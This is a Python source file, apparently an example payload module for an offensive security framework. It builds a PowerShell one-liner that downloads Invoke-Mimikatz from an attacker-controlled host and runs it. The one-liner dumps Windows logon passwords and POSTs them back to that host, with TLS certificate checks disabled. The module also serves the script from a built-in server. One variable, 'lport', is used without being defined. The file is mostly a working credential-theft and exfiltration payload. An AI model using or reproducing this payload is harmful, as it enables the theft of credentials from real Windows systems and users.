import string
from core.helpers import powershell_launcher_arch
from core.servers.powershell import PowershellServer
from random import sample

class Payload():

    def __init__(self, mainMenu):

        self.mainMenu = mainMenu
        self.server   = None

        self.info = {

            'Name': 'Example Module',
            'Author': ['@byt3bl33d3r'],
            'OpsecSafe' : True,
            'Description': ('description line 1'
                            'description line 2'),

        }

        self.options = {

            'LHOST': {

                'Description' : 'Lhost',
                'Required'    : True,
                'Value'       : ''
            },

            'SERVER_PORT' : {
                
                'Description'   : 'The server port',
                'Required'      : True,
                'Value'         : '4443'
            },


            'SERVER' : {

                'Description'   : 'Server to use',
                'Required'      : True,
                'Value'         : 'HTTPS'
            },

            'URIPATH': {
                'Description'   : 'URL Path',
                'Required'      : True,
                'Value'         : '/' + ''.join(sample(string.ascii_letters, 10))
            },

            'MIMI_CMD' : {

                'Description'   : 'Mimikatz command(s)',
                'Required'      : True,
                'Value'         : 'privilege::debug sekurlsa::logonpasswords exit'
            }
        }

    def output_callback(self, data):
        print 'Yay! Got {} bytes of data!'.format(len(data))

    def handler(self):
        server = self.options['SERVER']['Value'].lower()
        server_port = self.options['SERVER_PORT']['Value']
        url = self.options['URIPATH']['Value']

        self.server = PowershellServer(server, 
                                     server_port, 
                                     url,
                                     'data/powershell/PowerSploit/Exfiltration/Invoke-Mimikatz.ps1',
                                     self.output_callback)

        self.server.start_server()

    def generate(self):

        server = self.options['SERVER']['Value'].lower()
        server_port = self.options['SERVER_PORT']['Value']
        lhost = self.options['LHOST']['Value']
        mimi_cmd = self.options['MIMI_CMD']['Value']
        url = self.options['URIPATH']['Value']

        command = """
        IEX (New-Object Net.WebClient).DownloadString('{protocol}://{addr}:{port}{url}');
        $creds = Invoke-{func_name} -Command '{katz_cmd}';
        $request = [System.Net.WebRequest]::Create('{protocol}://{addr}:{port}/');
        $request.Method = 'POST';
        $request.ContentType = 'application/x-www-form-urlencoded';
        $bytes = [System.Text.Encoding]::ASCII.GetBytes($creds);
        $request.ContentLength = $bytes.Length;
        $requestStream = $request.GetRequestStream();
        $requestStream.Write( $bytes, 0, $bytes.Length );
        $requestStream.Close();
        $request.GetResponse();""".format(protocol=server,
                                          addr=lhost,
                                          port=lport,
                                          url=url,
                                          func_name=self.server.obfs_function_name,
                                          katz_cmd=mimi_cmd)

        if server == 'https':
            command = '[Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};' + command

        return powershell_launcher_arch(command)